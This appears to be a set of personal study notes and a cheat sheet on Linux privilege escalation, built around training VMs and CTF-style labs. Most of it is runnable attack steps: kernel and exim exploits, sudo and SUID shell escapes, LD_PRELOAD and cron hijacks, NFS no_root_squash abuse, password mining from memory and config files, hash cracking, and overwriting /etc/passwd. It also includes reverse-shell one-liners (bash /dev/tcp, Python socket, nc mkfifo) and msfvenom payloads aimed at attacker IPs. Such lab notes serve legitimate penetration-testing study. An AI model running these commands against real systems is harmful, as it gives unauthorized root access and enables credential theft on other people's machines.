+Try things that don’t have many steps first, e.g. Sudo, Cron Jobs, SUID files.
+Have a good look at root processes, enumerate their versions and search for exploits.
+Check for internal ports that you might be able to forward to your attacking machine.
+
+169
+Strategy
+
+If you still don’t have root, re-read your full enumeration dumps and highlight anything that seems odd.
+This might be a process or file name you aren’t familiar with, an “unusual” filesystem configured (on Linux, anything that isn’t ext, swap, or tmpfs), or even a username.
+At this stage you can also start to think about Kernel Exploits.
+
+170
+Don’t Panic
+
+Privilege Escalation is tricky. Practice makes perfect.
+Remember: in an exam setting, it might take a while to find the method, but the exam is always intended to be completed within a timeframe. Keep searching!
+171
+look for the ssh private key of root
+Linux Lab Exercises
+
+Exercise 1 – Kernel
+Detection
+Linux VM
+    1. In command prompt type:
+/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
+    2. From the output, notice that the OS is vulnerable to “dirtycow”.
+
+Exploitation
+Linux VM
+    1. In command prompt type:
+gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
+    2. In command prompt type: ./c0w
+    3. In command prompt type: passwd
+    4. In command prompt type: id
+
+
+Exercise 2 – Daemons
+Detection
+Linux VM
+    1. In command prompt type: dpkg -l | grep -i exim
+    2. From the output, notice that exim’s version is below 4.86.2.
+    3. In command prompt type: exim -bV -v | grep -i perl
+    4. From the output, notice that exim was compiled with Perl support.
+    5. In command prompt type: head /etc/exim.conf
+    6. From the output, notice that the configuration contains the “perl_startup” option.
+
+Exploitation
+Linux VM
+    1. In command prompt type: /home/user/tools/exim/cve-2016-1531.sh
+    2. In command prompt type: id
+Exercise 3 – Password Mining (Memory)
+Exploitation
+Kali VM
+    1. In command prompt type: msfconsole
+    2. In Metasploit (msf > prompt) type: use auxiliary/server/ftp
+    3. In Metasploit (msf > prompt) type: set FTPUSER user
+    4. In Metasploit (msf > prompt) type: set FTPPASS password321
+    5. In Metasploit (msf > prompt) type: run
+
+Linux VM
+    1. In command prompt type: ftp [Kali VM IP Address]
+    2. In ftp, type: user
+    3. In ftp, type: password321
+    4. In ftp press ctrl-z
+    5. In command prompt type: ps -ef | grep ftp
+    6. Make note of the PID of the ftp process.
+    7. In command prompt type: gdb -p [FTP PID]
+    8. In GDB, (gdb) prompt, type: info proc mappings
+    9. From the output, note the start and end memory addresses of the “[heap]”
+    10. In GDB. (gdb) prompt, type: q
+    11. In GDB, (gdb) prompt, type: dump memory /tmp/mem [Start Address] [End Address]
+    12. In GDB. (gdb) prompt, type: q
+    13. In command prompt type: strings /tmp/mem | grep passw
+    14. From the output, note the credentials in clear-text.
+
+
+Exercise 4 – Password Mining (Configuration Files)
+Exploitation
+Linux VM
+    1. In command prompt type: cat /home/user/myvpn.ovpn
+    2. From the output, make note of the value of the “auth-user-pass” directive.
+    3. In command prompt type: cat /etc/openvpn/auth.txt
+    4. From the output, make note of the clear-text credentials.
+    5. In command prompt type: cat /home/user/.irssi/config | grep -i passw
+    6. From the output, make note of the clear-text credentials.
+
+
+Exercise 5 – Password Mining (History)
+Exploitation
+Linux VM
+    1. In command prompt type: cat ~/.bash_history | grep -i passw
+    2. From the output, make note of the clear-text credentials.
+Exercise 6 – Sudo (Shell Escape Sequences)
+Detection
+Linux VM
+    1. In command prompt type: sudo -l
+    2. From the output, notice the list of programs that can run via sudo.
+
+Exploitation
+Linux VM
+    1. In command prompt type any of the following:
+        a. sudo find /bin -name nano -exec /bin/sh \;
+        b. sudo awk 'BEGIN {system("/bin/sh")}'
+        c. echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
+        d. sudo vim -c '!sh'
+
+
+Exercise 7 – Sudo (Abusing Intended Functionality)
+Detection
+Linux VM
+    1. In command prompt type: sudo -l
+    2. From the output, notice the list of programs that can run via sudo.
+
+Exploitation
+Linux VM
+    1. In command prompt type: sudo apache2 -f /etc/shadow
+    2. From the output, copy the root hash.
+
+Kali VM
+    1. Open command prompt and type: echo '[Pasted Root Hash]' > hash.txt
+    2. In command prompt type:
+john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
+    3. From the output, notice the cracked credentials.
+Exercise 8 – Sudo (LD_PRELOAD)
+Detection
+Linux VM
+    1. In command prompt type: sudo -l
+    2. From the output, notice that the LD_PRELOAD environment variable is intact.
+
+Exploitation
+    1. Open a text editor and type:
+
+    2. Save the file as x.c
+    3. In command prompt type:
+gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
+    4. In command prompt type:
+sudo LD_PRELOAD=/tmp/x.so apache2
+    5. In command prompt type: id
+
+
+Exercise 9 – NFS
+Detection
+Linux VM
+    1. In command line type: cat /etc/exports
+    2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.
+
+Exploitation
+Kali VM
+    1. Open command prompt and type: showmount -e [Linux VM IP Address]
+    2. In command prompt type: mkdir /tmp/1
+    3. In command prompt type: mount -o rw,vers=2 [Linux VM IP Address]:/tmp /tmp/1 In command prompt type:
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
+    4. In command prompt type: gcc /tmp/1/x.c -o /tmp/1/x
+    5. In command prompt type: chmod +s /tmp/1/x
+
+Linux VM
+    1. In command prompt type: /tmp/x
+    2. In command prompt type: id
+Exercise 10 – Cron (Path)
+Detection
+Linux VM
+    1. In command prompt type: cat /etc/crontab
+    2. From the output, notice the value of the “PATH” variable.
+
+Exploitation
+Linux VM
+    1. In command prompt type:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+    2. In command prompt type: chmod +x /home/user/overwrite.sh
+    3. Wait 1 minute for the Bash script to execute.
+    4. In command prompt type: /tmp/bash -p
+    5. In command prompt type: id
+
+
+Exercise 11 – Cron (Wildcards)
+Detection
+Linux VM
+    1. In command prompt type: cat /etc/crontab
+    2. From the output, notice the script “/usr/local/bin/compress.sh”
+    3. In command prompt type: cat /usr/local/bin/compress.sh
+    4. From the output, notice the wildcard (*) used by ‘tar’.
+
+Exploitation
+Linux VM
+    1. In command prompt type:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
+    2. touch /home/user/--checkpoint=1
+    3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh
+    4. Wait 1 minute for the Bash script to execute.
+    5. In command prompt type: /tmp/bash -p
+    6. In command prompt type: id
+Exercise 12 – Cron (File Overwrite)
+Detection
+Linux VM
+    1. In command prompt type: cat /etc/crontab
+    2. From the output, notice the script “overwrite.sh”
+    3. In command prompt type: ls -l /usr/local/bin/overwrite.sh
+    4. From the output, notice the file permissions.
+
+Exploitation
+Linux VM
+    1. In command prompt type:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
+    2. Wait 1 minute for the Bash script to execute.
+    3. In command prompt type: /tmp/bash -p
+    4. In command prompt type: id
+
+
+Exercise 13 – File Permissions (Suid Binary – .so Injection)
+Detection
+Linux VM
+    1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
+    2. From the output, make note of all the SUID binaries.
+    3. In command line type:
+strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+    4. From the output, notice that a .so file is missing from a writable directory.
+
+Exploitation
+Linux VM
+    5. In command prompt type: mkdir /home/user/.config
+    6. Open a text editor and type:
+
+    7. Save the file as libcalc.c
+    8. In command prompt type:
+gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
+    9. In command prompt type: /usr/local/bin/suid-so
+    10. In command prompt type: id
+Exercise 14 – File Permissions (SUID Binary – Symlink)
+Detection
+Linux VM
+    1. In command prompt type: dpkg -l | grep nginx
+    2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.
+
+Exploitation
+Linux VM – Terminal 1
+    1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: su
+    2. Once escalated to root, in command prompt type: su -l www-data
+    3. In command prompt type: /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
+    4. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.
+
+Linux VM – Terminal 2
+    1. Once logged in, type: su
+    2. As root, type the following: invoke-rc.d nginx rotate >/dev/null 2>&1
+    3. Switch back to the previous terminal.
+
+Linux VM – Terminal 1
+    1. From the output, notice that the exploit continued its execution.
+    2. In command prompt type: id
+
+
+Exercise 15 – File Permissions (SUID Binary – Environment Variables #1)
+Detection
+Linux VM
+    1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
+    2. From the output, make note of all the SUID binaries.
+    3. In command prompt type: strings /usr/local/bin/suid-env
+    4. From the output, notice the functions used by the binary.
+
+Exploitation
+Linux VM
+    1. In command prompt type:
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
+    2. In command prompt type: gcc /tmp/service.c -o /tmp/service
+    3. In command prompt type: export PATH=/tmp:$PATH
+    4. In command prompt type: /usr/local/bin/suid-env
+    5. In command prompt type: id
+Exercise 16 – File Permissions (SUID Binary – Environment Variables #2)
+Detection
+Linux VM
+    1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
+    2. From the output, make note of all the SUID binaries.
+    3. In command prompt type: strings /usr/local/bin/suid-env
+    4. From the output, notice the functions used by the binary.
+
+Exploitation Method #1
+Linux VM
+    1. In command prompt type:
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+    2. In command prompt type: export -f /usr/sbin/service
+    3. In command prompt type: /usr/local/bin/suid-env2
+
+Exploitation Method #2
+Linux VM
+1. In command prompt type:
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
+run "uname -a" cmd and then find the kernal and then see for any kernal exploits google,duckduckgo,github,exploit db,searchsploit (avalibe in kali terminal) and youtube and linux exploit suggester -2 might help you but do it if noting works
+
+
+Service Exploits
+
+The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.
+Change into the /home/user/tools/mysql-udf directory:
+cd /home/user/tools/mysql-udf
+Compile the raptor_udf2.c exploit code using the following commands:
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+Connect to the MySQL service as the root user with a blank password:
+mysql -u root
+Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+/tmp/rootbash -p
+Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!
+rm /tmp/rootbash
+exit
+
+
+Weak File Permissions - Readable /etc/shadow
+
+The /etc/shadow file contains user password hashes and is usually readable only by the root user.
+Note that the /etc/shadow file on the VM is world-readable:
+ls -l /etc/shadow
+View the contents of the /etc/shadow file:
+cat /etc/shadow
+Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.
+save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Switch to the root user, using the cracked password:
+su root
+
+
+Weak File Permissions - Writable /etc/shadow
+
+The /etc/shadow file contains user password hashes and is usually readable only by the root user.
+Note that the /etc/shadow file on the VM is world-writable:
+ls -l /etc/shadow
+Generate a new password hash with a password of your choice:
+mkpasswd -m sha-512 newpasswordhere
+Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
+Switch to the root user, using the new password:
+su root
+
+
+Weak File Permissions - Writable /etc/passwd
+
+The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.
+Note that the /etc/passwd file is world-writable:
+ls -l /etc/passwd
+Generate a new password hash with a password of your choice:
+openssl passwd newpasswordhere
+Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
+Switch to the root user, using the new password:
+su root
+Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").
+Now switch to the newroot user, using the new password:
+su newroot
+
+
+Sudo - Shell Escape Sequences
+
+List the programs which sudo allows your user to run:
+sudo -l
+Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
+Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.
+For an extra challenge, try to gain a root shell using all the programs on the list!
+
+
+Sudo - Environment Variables
+
+Sudo can be configured to inherit certain environment variables from the user's environment.
+Check which environment variables are inherited (look for the env_keep options):
+sudo -l
+LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
+Create a shared object using the code located at /home/user/tools/sudo/preload.c:
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.
+Run ldd against the apache2 program file to see which shared libraries are used by the program:
+ldd /usr/sbin/apache2
+Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
+sudo LD_LIBRARY_PATH=/tmp apache2
+A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.
+
+
+Cron Jobs - File Permissions
+
+Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.
+View the contents of the system-wide crontab:
+cat /etc/crontab
+There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
+Locate the full path of the overwrite.sh file:
+locate overwrite.sh
+Note that the file is world-writable:
+ls -l /usr/local/bin/overwrite.sh
+Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
+nc -nvlp 4444
+
+
+Cron Jobs - PATH Environment Variable
+
+View the contents of the system-wide crontab:
+cat /etc/crontab
+Note that the PATH variable starts with /home/user which is our user's home directory.
+Create a file called overwrite.sh in your home directory with the following contents:
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+Make sure that the file is executable:
+chmod +x /home/user/overwrite.sh
+Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
+/tmp/rootbash -p
+Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!
+rm /tmp/rootbash
+exit
+
+
+Cron Jobs - Wildcards
+
+View the contents of the other cron job script:
+cat /usr/local/bin/compress.sh
+Note that the tar command is being run with a wildcard (*) in your home directory.
+Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.
+Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:
+chmod +x /home/user/shell.elf
+Create these two files in /home/user:
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
+Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
+nc -nvlp 4444
+Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:
+rm /home/user/shell.elf
+rm /home/user/--checkpoint=1
+rm /home/user/--checkpoint-action=exec=shell.elf
+
+
+SUID / SGID Executables - Known Exploits
+
+Find all the SUID/SGID executables on the Debian VM:
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. Exploit-DB, Google, and GitHub are good places to search!
+A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at /home/user/tools/suid/exim/cve-2016-1531.sh.
+Run the exploit script to gain a root shell:
+/home/user/tools/suid/exim/cve-2016-1531.sh
+Remember to exit out of the root shell before continuing!
+
+
+SUID / SGID Executables - Shared Object Injection
+
+The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.
+First, execute the file and note that currently it displays a progress bar before exiting:
+/usr/local/bin/suid-so
+Run strace on the file and search the output for open/access calls and for "no such file" errors:
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.
+Create the .config directory for the libcalc.so file:
+mkdir /home/user/.config
+Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.
+/usr/local/bin/suid-so
+
+
+SUID / SGID Executables - Environment Variables
+
+The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.
+First, execute the file and note that it seems to be trying to start the apache2 webserver:
+/usr/local/bin/suid-env
+Run strings on the file to look for strings of printable characters:
+strings /usr/local/bin/suid-env
+One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.
+Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:
+gcc -o service /home/user/tools/suid/service.c
+Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
+PATH=.:$PATH /usr/local/bin/suid-env
+
+
+SUID / SGID Executables - Abusing Shell Features (#1)
+
+The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.
+Verify this with strings:
+strings /usr/local/bin/suid-env2
+In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
+Verify the version of Bash installed on the Debian VM is less than 4.2-048:
+/bin/bash --version
+Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+Run the suid-env2 executable to gain a root shell:
+/usr/local/bin/suid-env2
+
+
+SUID / SGID Executables - Abusing Shell Features (#2)
+
+Note: This will not work on Bash versions 4.4 and above.
+When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
+Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+/tmp/rootbash -p
+Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!
+rm /tmp/rootbash
+exit
+
+
+
+Passwords & Keys - History Files
+
+If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
+View the contents of all the hidden history files in the user's home directory:
+cat ~/.*history | less
+Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!
+Switch to the root user, using the password:
+su root
+
+
+Passwords & Keys - Config Files
+
+Config files often contain passwords in plaintext or other reversible formats.
+List the contents of the user's home directory:
+ls /home/user
+Note the presence of a myvpn.ovpn config file. View the contents of the file:
+cat /home/user/myvpn.ovpn
+The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:
+su root
+
+
+Passwords & Keys - SSH Keys
+
+Sometimes users make backups of important files but fail to secure them with the correct permissions.
+Look for hidden files & directories in the system root:
+ls -la /
+Note that there appears to be a hidden directory called .ssh. View the contents of the directory:
+ls -l /.ssh
+Note that there is a world-readable file called root_key. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.
+Copy the key over to your Kali box (it's easier to just view the contents of the root_key file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:
+chmod 600 root_key
+Use the key to login to the Debian VM as the root account (change the IP accordingly):
+ssh -i root_key root@10.10.10.10
+
+
+NFS
+
+Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
+Check the NFS share configuration on the Debian VM:
+cat /etc/exports
+Note that the /tmp share has root squashing disabled.
+On your Kali box, switch to your root user if you are not already running as root:
+sudo su
+Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):
+mkdir /tmp/nfs
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
+Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+Still using Kali's root user, make the file executable and set the SUID permission:
+chmod +xs /tmp/nfs/shell.elf
+Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
+/tmp/shell.elf
+
+
+Kernel Exploits
+
+Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.
+Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:
+perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).
+Compile the code and run it (note that it may take several minutes to complete):
+gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+./c0w
+Once the exploit completes, run /usr/bin/passwd to gain a root shell:
+/usr/bin/passwd
+Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!
+mv /tmp/bak /usr/bin/passwd
+exit
+
+
+Privilege Escalation Scripts
+
+Several tools have been written which help find potential privilege escalations on Linux. Three of these tools have been included on the Debian VM in the following directory: /home/user/tools/privesc-scripts
+
+
+Linux Privilege Escalation: Quick and Dirty
+Automated Tooling
+
+Usually, my approach is to use an automated tool in conjunction with some manual enumeration. However, you can completely accomplish the Privilege Escalation process from an automated tool paired with the right exploitation methodology.
+
+1. Linpeas.sh (my go-to, fully automated)
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+2. Linprivchecker.py (my backup)
+https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
+3. Linux-Exploit-Suggest-2.pl (To look for those sneaky little Kernel Exploits)
+https://github.com/jondonas/linux-exploit-suggester-2
+Resources
+
+Keep in mind, that these are just some of the techniques I have used. You’ll find that some of the existing Linux Privilege escalation guides are much more comprehensive:
+
+1. The Holy Grail
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+2. My Second Favorite Guide
+https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_inux.html__
+3. GTFOBins (The most comprehensive binary privesc guide)
+https://gtfobins.github.io/
+Techniques
+
+God Mode
+
+history
+
+I know, seems crazy, the history command? Why? Well, I’ve successfully performed privilege escalation from finding hints or credentials in the user’s history.
+
+Capabilities
+If there’s a capability that has a setuid+ep, the command might be able to be abused
+Example:
+/usr/bin/python2.6 = capsetuid+ep
+
+For instance, I used this cheat sheet for capability exploits
+ref: https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
+
+Changing WordPress Password via MySQL DB I came across a situation in which taking over the WordPress website was essentially in the privilege escalation process due to versioning.
+
+    Find MySQL credentials
+    Connect to the Localhost Database
+
+mysql -h localhost -u user -p
+
+    Authenticate using the credentials you found
+    Select the database that has the credentials table
+
+USE databasename;
+
+    Change the admin password or user’s password that you have access to
+
+UPDATE wp_users SET user_pass=PASSWORD('P@ssw0rd123!') WHERE user_login='wpadmin';
+
+    KEY: wp_users is the table, SET is for the user password field in the table, and where is for the user login field within the table.
+
+Permissive Root Script If a cron job is running a script as root, determine what the script is doing. If you have full permission to edit the script, you’re golden. Note: the » in the one-liner echo represents overwriting the file.
+
+Two of my favorite examples:
+
+Python One-Liner
+
+echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> test.py
+
+Bash One-Liner (If the script is a .sh)
+
+echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.10 7242 > /tmp/f" >> monitor.sh
+
+Now set up a listener on the defined port, and wait for the script to run.
+
+LD_Preload In some circumstances, you may be able to abuse certain services that run via LD_Preload.
+
+    Run:
+
+sudo -l
+
+    If env_keep+=LD+PRELOAD is seen:
+    Make a C script named “shell” or whatever you want
+
+nano shell.c
+
+    Place the following code in the script:
+
+    ```
+    \#include <stdio.h>
+       
+    \#include <sys/types.h>
+       
+    \#include <stdlib.h>
+       
+    void _init() {
+       
+    unsetenv("LD_PRELOAD");
+       
+    setgid(0);
+       
+    setuid(0);
+       
+    system("/bin/bash");
+       
+    }
+    ```
+
+    Compile the shell
+
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+    Take a look at what system services are being preloaded, for instance, if you see apache2 then you would do a sudo preload for apache2, escalating your current shell to a root level shell
+
+sudo LD_PRELOAD=/home/user/shell.so apache2
+
+Bash SUID This one absolutely blew my mind, I used it recently. If you find a private SSH Key, and you can log in with it: Check for a Bash SUID. If you have it, you might be able to escalate during authentication!
+
+ssh -i id_rsa user@ip bash -p
+
+Lua Privilege Escalation This is another one of those strange one-off scenarios. I had a script that allowed me to drop into a little command prompt and run different commands as root (but most of them would just print the word “nil”). I had no idea what was happening. After a little research, I found out that nil was Lua’s version of null (basically the error was telling me that it was attempting to use Lua commands but the commands used did not exist) and the prompt I was using was some sort of Lua Script. Jokingly, I typed the following:
+
+os.execute('/bin/sh')
+
+I was root!!
+
+Sudo Bypass
+
+I noticed the following entry [(ALL, !root) /bin/bash)] upon running:
+
+sudo -l 
+
+I had root permissions to run bash, an obvious win! Attempting to run it as the root user would not work. A quick google search helped me understand that it was a Sudo Privilege Escalation bypass:
+
+sudo -u#-1 /bin/bash
+
+Tar SUID
+If you find a Tar SUID assigned to your current user, it’s an easy win:
+
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+TMUX Session Running as Root
+I cannot express how many times this one has been overlooked. I’ve legitimately exploited 5+ systems in CTF-Like environments with this gem. If you see a TMUX session running as root, look at the path. Typically, I’ve seen the session running under /.devs/dev_sess
+
+This can be identified using:
+
+ps -aux | grep tmux
+
+If you see that, and a session is active as the root user, attempt an easy win:
+
+tmux -S /.devs/dev_sess
+
+If it works, check your privs! You might just be root.
+
+NMAP SUID
+Yes, another exceedingly simple win:
+
+nmap --interactive
+!sh
+
+Systemctl SUID
+Identifying this beauty represents yet another win
+
+Run each one of these commands in order:
+
+TF=$(mktemp).service
+
+echo '[Service]
+
+Type=oneshot
+
+ExecStart=/bin/sh -c "id > /tmp/output"
+
+[Install]
+
+WantedBy=multi-user.target' > $TF
+
+systemctl link $TF
+
+systemctl enable --now $TF
+
+Copy SUID
+
+Noticing the ‘cp’ command with SUID assigned to your user account could allow you to overwrite the passwd file of the victim system, giving yourself root permissions:
+
+    Open up a terminal in your attacking machine, create a salted password:
+
+openssl passwd -1 -salt roflroot pass123
+
+    Copy your attacking machine local passwd file to have something to edit:
+
+cp /etc/passwd /root/Exploits
+
+    Host HTTP Server:
+
+python -m SimpleHTTPServer 8000
+
+    Navigate to /tmp directory on the victim host machine or somewhere you have write permissions and download the passwd file:
+
+wget http://192.168.119.221:8000/passwd<br>
+<br>
+    Copy passwd file to /etc/passwd:<br>
+<br>
+cp passwd /etc/passwd<br>
+<br>
+    Switch to your created user:<br>
+<br>
+su roflroot<br>
+<br>
+<br>
